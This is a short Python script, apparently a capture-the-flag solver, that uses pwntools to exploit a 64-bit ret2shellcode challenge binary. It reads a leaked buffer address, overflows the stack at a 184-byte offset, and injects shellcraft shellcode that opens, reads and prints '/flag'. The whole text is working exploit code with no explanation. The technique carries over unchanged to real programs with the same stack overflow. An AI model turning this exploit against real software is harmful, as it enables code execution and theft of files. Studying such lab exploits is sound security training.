from pwn import *

# ==========================================
# CONFIGURATION
# ==========================================

# File executable target

exe = "/challenge/ret2shellcode-64" 
elf = ELF(exe)
context.binary = elf
context.arch = elf.arch
context.log_level = "debug"

# ==========================================
# CONNECTION
# ==========================================

io = process(exe)

# ==========================================
# EXPLOIT / SOLVER
# ==========================================

def exploit(io):
    offset = 184 # 0xb0 + 8 saved return adress
    
    sc = shellcraft.open('/flag')
    sc += shellcraft.read(3 , 'rsp' , 0x340)
    sc += shellcraft.write(1 , 'rsp' , 'rax')
    
    io.recvuntil(b'buff sits at ')
    buf_addr = int(io.recvline(), 16)
    
    payload  = asm(sc).ljust(offset, b'A') + p64(buf_addr)
    
    io.recvuntil(b"Speak: ")
    io.sendline(payload)

    print(io.recvall().decode(errors='ignore'))


# ==========================================
# MAIN
# ==========================================

def main():

    exploit(io)
    
    io.interactive()


if __name__ == "__main__":
    main()
